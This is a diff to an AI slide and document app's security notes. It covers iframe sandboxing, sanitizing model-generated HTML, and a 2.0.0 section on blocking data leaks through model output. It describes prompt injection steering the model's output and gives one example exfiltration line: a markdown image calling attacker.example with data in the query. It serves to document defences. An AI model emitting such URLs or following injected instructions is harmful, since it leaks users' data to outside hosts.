@@ -112,7 +112,7 @@ A design system (DS) is HTML and CSS that comes from outside (an agency bundle, 
 | Where | Sandbox | Assessment |
 |---|---|---|
 | `DeckTemplateInspector.tsx:120,131` and the thumbnail without `previewCardHtml` (`DeckTemplatesSettings.tsx`) | `allow-scripts` | Acceptable. The DS scripts run with an opaque origin (no cookies, no app `/api`, no navigation of the top page, no pop-ups). They can still make outbound network requests, but the frame holds only the DS itself. |
-| `deck/HtmlSlideFrame.tsx:138`, `deck/HtmlSlideEditor.tsx:838` | `allow-scripts` | **Follow-up.** The slide HTML comes from the model, and the server (`sanitizeHtmlDeck`, `server/blocks.ts:75`) removes only `<script>…</script>` with a regex. `on*` attributes survive and run in these frames. The origin is opaque (no access to the API), but a slide generated through prompt injection could send the slide content off-site and, in the editor, send an `html` message that the parent accepts (`e.source` is checked) and saves into the same deck. Proposed fix: sanitize the deck HTML on the server with the same library (the editor runtime is injected by the client, so the content can stay free of handlers), and add a CSP with `connect-src`. |
+| `deck/HtmlSlideFrame.tsx`, `deck/HtmlSlideEditor.tsx` | `allow-scripts` | Acceptable with the layers below. The slide HTML comes from the model. The server (`sanitizeHtmlDeck`, `server/blocks.ts`) sanitizes it with the allowlist sanitizer on every save and on read (handlers, `javascript:` URLs, `<base>`, `<meta http-equiv>`, `<link>`, frames and forms, remote `src`, `srcset`, `url()` and `@import`), and the enforced CSP blocks remote loads, remote scripts and `connect-src`. The origin is opaque (no access to the API). Left open: WebRTC from inline script (see the CSP paragraph above). |
 | `lib/domToSlideOps.ts:476`, `allow-same-origin`, no scripts | `allow-same-origin` | Acceptable. Hidden frame used to measure layout during export. Scripts and handlers do not run, and no node from the frame is moved into the main document. Do not add `allow-scripts` here: with `allow-same-origin`, that gives full access to the app. |
 | `HtmlDeckPreview.tsx:53` | `allow-same-origin`, no scripts | Acceptable, same rule. The component is not imported anywhere (dead code, a candidate for removal). |
 
@@ -121,6 +121,24 @@ A design system (DS) is HTML and CSS that comes from outside (an agency bundle, 
 What this **does not** cover: the DS itself is still trusted content for the prompt (a global DS influences every user's decks), and the app's CSP (above) blocks remote scripts, images, fonts, styles and `connect-src` in these frames but still allows inline script, so WebRTC stays open (navigating the frame to an outside host is blocked by `frame-src`).
 
 When the app fetches a URL chosen by the model (the web page tool), the connection follows only public addresses. Loopback, private networks, CGNAT, link-local (including the cloud metadata endpoint), ULA, and reserved addresses are blocked at every redirect hop. The same rule is in `server/a2aGuard.ts`, which will be used by A2A.
+
+## Data leaving through model output (2.0.0)
+
+Text that the model writes can be steered by what it reads (a document, a web page, an MCP or Genie result). A URL in that text can carry data: `![x](https://attacker.example/p.png?d=<data>)` makes the browser call the host with no click, and the same works for a remote font, stylesheet or script in a document, a slide or a design-system card. **Versions before 2.0.0 are exposed to this. Upgrade to 2.0.0.**
+
+2.0.0 closes it in layers:
+
+- **Enforced CSP** (`server/securityHeaders.ts`): images, fonts, styles, media, fetches and frames load only from the app, `data:` and `blob:`; `script-src 'self' 'unsafe-inline'` blocks remote scripts. One header covers every `srcdoc` frame (documents, slides, export, print), streaming and old messages alike.
+- **Allowlist.** An admin adds origins in Settings > Administrators > *External asset origins* (stored in `app_settings.external_asset_origins`, live within about 15 s, audited as `egress.settings`); `EXTERNAL_ASSET_ORIGINS` in `app.yaml` is a floor. Entries are `https://host[:port]`, with no wildcard, path or IP, never the app, workspace or Databricks hosts. They open only `img-src`, `font-src` and `style-src`; never `connect-src`, `media-src`, `frame-src`, `default-src` or `script-src`.
+- **Placeholder** for an external image in a chat answer or a document (host shown, no "load anyway").
+- **Deck sanitizer** on save and on read, chat snapshots included; the design-system importer warns about external references it strips.
+- **`web_fetch` provenance**: only a URL the user typed or a `web_search`/`web_fetch` result listed. Other tool results are not sources.
+- **Artifact byte routes** (images, exports): sandbox CSP, `nosniff`, `attachment`.
+- **Logs**: `egress_blocked` and `csp_violation`, host or directive only. See [docs/operations.md](docs/operations.md#617-egress-csp-200-allow-an-origin-emergency-switch-reading-the-logs).
+
+`CSP_EGRESS=report` (exactly that value, in `app.yaml`, same build) reverts only the browser part to report-only. The placeholder, sanitizer, `web_fetch` rule and prompt rule stay on.
+
+**What this does not cover.** Tool arguments are not a browser path: keep the serverless network policy restrictive (no outbound network for the Python tool), review which external MCP tools can write or publish and disable the ones not needed, and remember that web-search queries go to the provider the admin chose. WebRTC from inline script in sandboxed frames stays open until those frames get their own origin and policy (frame navigation is blocked by `frame-src`).
 
 ## Generated images (UC Volume)
 
